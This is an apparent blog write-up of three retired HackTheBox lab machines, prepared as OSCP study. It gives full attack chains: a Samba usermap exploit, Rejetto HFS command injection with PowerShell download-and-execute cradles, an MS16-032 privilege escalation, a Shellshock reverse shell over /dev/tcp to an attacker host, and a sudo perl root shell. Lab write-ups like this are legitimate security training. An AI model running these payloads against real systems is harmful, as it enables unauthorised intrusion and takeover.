+++
title = "HTB Easy Round-Up (Part 2): Lame, Optimum, Shocker -- Write-Ups"
description = "Walkthrough write-up of the Lame, Optimum, Shocker HackTheBox CTFs"
type = ["posts","post"]
tags = [
    "SMB",
    "CVE-2007-2447",
    "Rejetto",
    "HFS",
    "Sherlock",
    "Nishang",
    "shellshock",
    "Bash",
    "Perl"
]
date = "2023-01-23T10:25:00"
categories = [
    "ctf",
    "HackTheBox",
    "TJNull List"
]
[ author ]
  name = "virtualtack"
+++

## About 
This is the second installment of walkthroughs for three *easy* rated, retired HackTheBox machines. I am currently making my way through Offensive Security's PEN-200 course, with plans to take the OSCP exam later this year. As part of my preparations, I am working on the infamous TJNull list of OSCP prep-relevant machines across the popular CTF and training platforms. The list can be found [here](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit?usp=sharing).

At this moment, I have completed 17 HTB machines from the TJNull list and I am approximately 30% of the way through PEN-200, with all course exercises finished for the first 10 sections of the course.

<br/><br/>
**Note:** I have replaced all instances of the target virtual machine's ip addresses with `<target-ip>` (and my own Kali ip address with `<kali-ip>` ) throughout this write-up.

## Lame
Rooting this box involves the discovery and exploitation of an obsolete SMB share via MS-RPC calls containing unfiltered user input via a username mapping script built in to the software.

### Enumeration
#### nmap
Our nmap host scan returns the following services:

```
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)

22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)

139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

Digging deeper into the Samba SMB shares via nmap's scripting engine, we glean the following:
```
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))

```

As anonymous logins are permitted, we investigate the shares, especially the `tmp/` directory, though ultimately nothing of value is located. 

## Exploitation

### Known vulnerability - CVE-2007-2447
While none of the contents of the SMB shares give us a path onto the box, searching ExploitDB for the service version (`Samba 3.0.20`) returns several results, though none are directly useful. Instead, further research of Samba 3.0.20 yields [CVE-2007-2447](https://github.com/amriunix/CVE-2007-2447). This script [exploits a weakness in Samba 3.0.0 - 3.0.25rc3](https://amriunix.com/post/cve-2007-2447-samba-usermap-script/) that allows for unathenticated RCE via the use of usernames that contain shell meta characters.

```
$ python2 usermap_script.py
[*] CVE-2007-2447 - Samba usermap script
[-] usage: python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>
```

The script is very easy to use and immediately provides us with `root` access to the box.

```
$ nc -lvnp 8008
listening on [any] 8008 ...
connect to [<kali-ip>] from (UNKNOWN) [<target-ip>] 41884
whoami
root
```

## Optimum
Optimum is a Windows box with a Rejetto HFS vulnerability that allows for unauthenticated RCE. From the initial foothold, we are able to use Sherlock to identify the MS16-032 vulnerability, which, in turn, gives us `SYSTEM` access.

### Enumeration
#### nmap

Our nmap scans reveal the following HTTP server running on the host box:

```
80/tcp open  http    syn-ack ttl 127 HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
```

Visiting the web root, we find the following, which we identify as `HFS - HTTP File Server`, also known as a `rejetto` project:
http://www.rejetto.com/hfs/

![](/images/optimum/hfs.png)

## Foothold

Googling `Rejetto HTTP File Server Exploit` gives us a [Rapid7 page](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/) explaining the method of exploitation:

> Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a poor regex in the file ParserLib.pas.  This module exploits the HFS scripting commands by using '%00' to bypass the filtering. This module has been tested successfully on HFS 2.3b over Windows XP SP3, Windows 7 SP1 and Windows 8. 

At this point, we could either choose to employ Metasploit, or exploit the service manually. We will do the latter, in the spirit of OSCP preparations.

We first familiarize ourselves with HFS commands. This can be easily done via the official documentation, located here:  https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands

```
exec | A
    ask system to run file A, eventually with parameters. If you need to use the pipe, then use macro quoting.
    Optional parameter out will let you capture the console output of the program in the variable specified by name.
    Optional parameter timeout will specify the max number of seconds the app should be left running.
    Example: {.exec|notepad.}
```

So with `Example: {.exec|notepad.}` in hand, we can open Burp and capture a request to begin.

### Burp

Here is our request, populated with one null byte in the query:

```
GET /?search=%00 HTTP/1.1
Host: <target-ip>
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://<target-ip>/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: HFS_SID=0.878811701899394
Connection: close

```

Let's try to use the `{.exec|notepad.}` syntax to try to ping our attacking machine with the `ping` utility.

Our request is:
```
GET /?search=%00{.exec|ping+<kali-ip>.} HTTP/1.1
```

**Note:** Remember that these commands *must* be URL encoded (Burp shortcut: `CTRL+U`).

We then fire up `tcpdump` to monitor incoming traffic and check for the ping.

`sudo tcpdump -i tun0`
```
$ sudo tcpdump -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes

15:53:52.835671 IP kali-bot.57694 > <target-ip>.http: Flags [S], seq 1188628820, win 64240, options [mss 1460,sackOK,TS val 4150609100 ecr 0,nop,wscale 7], length 0

15:53:52.852623 IP <target-ip>.http > kali-bot.57694: Flags [S.], seq 1785899650, ack 1188628821, win 8192, options [mss 1337,nop,wscale 8,sackOK,TS val 5969016 ecr 4150609100], length 0

15:53:52.852642 IP kali-bot.57694 > <target-ip>.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 4150609117 ecr 5969016], length 0

15:53:52.852825 IP kali-bot.57694 > <target-ip>.http: Flags [P.], seq 1:525, ack 1, win 502, options [nop,nop,TS val 4150609117 ecr 5969016], length 524: HTTP: GET /?search=%2500{.exec|ping+<kali-ip>.} HTTP/1.1

15:53:52.889119 IP <target-ip>.http > kali-bot.57694: Flags [P.], seq 1:194, ack 525, win 258, options [nop,nop,TS val 5969020 ecr 4150609117], length 193: HTTP: HTTP/1.1 200 OK
```

The ping works! Let's see if we can turn this into a reverse shell with Nishang's `Invoke PowerShell shell via TCP` script. 


### Nishang Reverse Shell

**Copy Nishang reverse shell**
```
cp /home/virtualtack/tools/shells/reverse-shells/nishang/Invoke-PowerShellTcp.ps1   .
```

We need to open the script file and add our reverse shell command to be invoked:

`Invoke-PowerShellTcp.ps1`
```
Invoke-PowerShellTcp -Reverse -IPAddress <kali-ip> -Port 8001
```

Now, back in Burp, we need to instruct the server to download the Nishang script and execute it (once again with a URL-encoded request):

```
GET /?search=%00{.exec|C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://<kali-ip>:8000/Invoke-PowerShellTcp.ps1').} HTTP/1.1
```

**Note:** We need to leverage the 64-bit version of PowerShell that resides at `C:\Windows\SysNative\PowerShell.exe`

After URL encoding, our request looks like:
```
GET /?search=%00{.exec|c%3a\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//<kali-ip>%3a8000/Invoke-PowerShellTcp.ps1').} HTTP/1.1
```

```
$ nc -lvnp 8001
listening on [any] 8001 ...
connect to [<kali-ip>] from (UNKNOWN) [<target-ip>] 49203
Windows PowerShell running as user kostas on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 
whoami      
optimum\kostas

```

### PrivEsc

Owing to the age of the machine, we opt to employ a Sherlock scan to help us identify vulnerabilities that will allow us to escalate our privileges to `SYSTEM`. To make this quicker, we can simply add the relevant `Find-AllVulns` function call to the end of the `Sherlock.ps1` script file to allow for immediate execution.

**Search `Sherlock.ps1` for functions**
```
grep -i function Sherlock.ps1
```

```
$ grep -i function Sherlock.ps1
function Get-FileVersionInfo ($FilePath) {
function Get-InstalledSoftware($SoftwareName) {
function Get-Architecture {
function Get-CPUCoreCount {
function New-ExploitTable {
function Set-ExploitTable ($MSBulletin, $VulnStatus) {
function Get-Results {
👍function Find-AllVulns 👍{
function Find-MS10015 {
function Find-MS10092 {
function Find-MS13053 {
function Find-MS13081 {
function Find-MS14058 {
function Find-MS15051 {
function Find-MS15078 {
function Find-MS16016 {
function Find-MS16032 {
function Find-MS16034 {
function Find-CVE20177199 {
function Find-MS16135 {
```

**Add `Find-AllVulns` command to end of script**
```
Find-AllVulns
```

We can then serve the script from our Kali machine and subsequently download it on the remote host.

**Download Sherlock** via PowerShell
```
IEX(New-Object Net.Webclient).downloadString('http://<kali-ip>:8000/Sherlock.ps1')
```

**results of `Sherlock.ps1`**
```
PS C:\Users\kostas\Desktop> IEX(New-Object Net.Webclient).downloadString('http://<kali-ip>:8000/Sherlock.ps1')


Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

✂️ ................................ ✂️

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

✂️ ................................ ✂️

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable

```

```
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Appears Vulnerable
```

Unfortunately, scripts written for `MS16-032` usually require interactivity and we don't have an interactive terminal. The exploit involves GUI elements. However, Empire has a pre-packed script for just this occasion!

You can read about `Invoke-MS16032.ps1` via InfosecMatter [here](https://www.infosecmatter.com/empire-module-library/?mod=powershell/privesc/ms16-032). In short, this is a race-condition vulnerability, which means that a) the remote host must utilize 2+ CPU cores and b) the exploit may occasionally unexpectedly fail. More information on MS16-032 can be found via Google's Project Zero: https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html

We copy the exploit to our local directory with:
```
cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/Invoke-MS16032.ps1 .
```

...and add the function call to the end of the script:
```
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://<kali-ip>:8000/shell.ps1')"
```
This calls a copy of our previous `Invoke-PowerShellTcp.ps1` reverse shell script, which will be executed with privileged permissions due to the MS16-032 vulnerability.

After setting up a quick python server, we are then ready to download and execute the exploitation script via PowerShell on the remote host:
```
IEX(New-Object Net.WebClient).downloadString('http://<kali-ip>:8000/Invoke-MS16032.ps1')
```


```
PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadString('http://<kali-ip>:8000/Invoke-MS16032.ps1')
		__ __ ___ ___   ___     ___ ___ ___ 
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
										
					[by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!

```

```
$ rlwrap nc -lvnp 8011
listening on [any] 8011 ...
connect to [<kali-ip>] from (UNKNOWN) [<target-ip>] 49248
Windows PowerShell running as user OPTIMUM$ on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
nt authority\system
```


## Shocker
Shocker, another venerable HTB box, features the Shellshock Bash vulnerability, which is paired with a relatively simple `sudo`-based prvilege escalation vector.

### Enumeration 
As usual, we begin with nmap scans to identify our attack surface.

#### nmap
```
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-date: Sat, 10 Dec 2022 01:43:13 GMT; -2s from local time.

2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
```

As the web root did not turn up anything actionable via manual browsing, we turn to Feroxbuster for content discovery. 


### feroxbuster

```
403      GET       11l       32w      294c http://<target-ip>/cgi-bin/
403      GET       11l       32w      299c http://<target-ip>/cgi-bin/.html
```

In consideration of the box's name, I began with the suspicion that we would encounter the famous Shellshock vulnerability. More information on this Bash vulnerability, which affects versions 1.0.3–4.3, can be found here: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 and here: https://en.wikipedia.org/wiki/Shellshock_(software_bug).

Additional content discovery efforts reveal the `user.sh` script file within the `/cgi-bin/` directory.

```
feroxbuster -u http://<target-ip>/cgi-bin/ -x htm,html,js,php,txt,json,zip,bak,pdf,docx,conf,py,js,sh,cgi,pl | tee cgi-feroxbuster.txt
```
```
200      GET        7l       18w        0c http://<target-ip>/cgi-bin/user.sh
```

From here, we can use a curl request to confirm that the server is vulnerable:
```
virtualtack@virtualshack ~/htb/shocker [±main U:2 ?:56 ✗] curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;" http://<target-ip>/cgi-bin/user.sh
shelly
```

Excellent! Now we can modify our request payload to contain shellcode, giving us a reverse shell.

## Foothold

`curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/sh -i >& /dev/tcp/<kali-ip>/9999 0>&1;" http://<target-ip>/cgi-bin/user.sh`
```
virtualtack@virtualshack ~/htb/shocker [±main U:2 ?:56 ✗] nc -lvnp 9999
listening on [any] 9999 ...
connect to [<kali-ip>] from (UNKNOWN) [<target-ip>] 49184
/bin/sh: 0: can't access tty; job control turned off
$ whoami
shelly
```

## PrivEsc

Luckily, the privilege escalation vector is simple. As one of our standard, initial checks after obtaining user access, we check to see which commands and/or binaries can be run by our user with `root` permissions.

```
$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

```

Thus, the `shelly` user account has been configured to run the `perl` binary locate din `/usr/bin/` with `root` privileges, all without needing the account password. From here, a [quick GTFOBins check](https://gtfobins.github.io/gtfobins/perl/) reveals that we simply need to run `sudo perl -e 'exec "/bin/sh";'` to spawn a shell session with full access.

```
$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
$ sudo perl -e 'exec "/bin/sh";'
whoami
root
```

## Lessons Learned
This round of TJNull boxes provided excellent opportunities for review

* Lame
    * This was my first exposure to CVE-2007-2447.
    * It was also a nice reminder that SMB shares that allow `anonymous` access do not always contain files that will lead to a foothold. Instead, the service itself can be vulnerable!
* Optimum
    * This was the first time that I needed to use HFS scripting, and the syntax was not immediately intuitive to me.
* Shocker
    * While I have encountered the Shellshock vulnerability previously, the name of the script file(s) in `/cgi-bin/` differed. This reinforced the importance of thorough content discovery/directory busting.